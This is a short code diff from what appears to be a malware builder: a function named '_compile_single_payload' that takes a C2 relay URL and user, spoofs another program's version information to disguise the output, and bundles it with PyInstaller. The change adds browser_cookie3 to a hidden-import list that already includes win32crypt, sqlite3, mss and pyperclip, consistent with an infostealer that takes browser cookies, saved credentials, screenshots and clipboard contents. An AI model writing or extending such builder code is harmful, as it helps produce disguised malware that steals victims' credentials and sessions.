@@ -92,8 +92,8 @@ def _compile_single_payload(settings, relay_url, c2_user, is_guardian, log_callb
             version_file_path = os.path.join(temp_dir, "version.txt")
             create_versionfile(output_file=version_file_path, version=cloning_settings["version_info"].get("FileVersion", "1.0.0.0"), company_name=cloning_settings["version_info"].get("CompanyName", ""), file_description=cloning_settings["version_info"].get("FileDescription", ""), internal_name=cloning_settings["version_info"].get("OriginalFilename", ""), legal_copyright=cloning_settings["version_info"].get("LegalCopyright", ""), original_filename=cloning_settings["version_info"].get("OriginalFilename", ""), product_name=cloning_settings["version_info"].get("ProductName", "")); command.extend(['--version-file', version_file_path])
 
-        # --- ADDED NEW HIDDEN IMPORTS ---
-        hidden_imports = ['requests', 'psutil', 'win32crypt', 'mss', 'PIL', 'winreg', 'shutil', 'sqlite3', 'cryptography', 'Crypto.Cipher', 'pyperclip', 'xml.etree.ElementTree']
+        # UPDATED: Added pycryptodomex and browser-cookie3 to hidden imports for new payload
+        hidden_imports = ['requests', 'psutil', 'win32crypt', 'mss', 'PIL', 'winreg', 'shutil', 'sqlite3', 'cryptography', 'Crypto.Cipher', 'pyperclip', 'xml.etree.ElementTree', 'browser_cookie3']
         for imp in hidden_imports: command.extend(['--hidden-import', imp])
         command.append(temp_script_path)
         
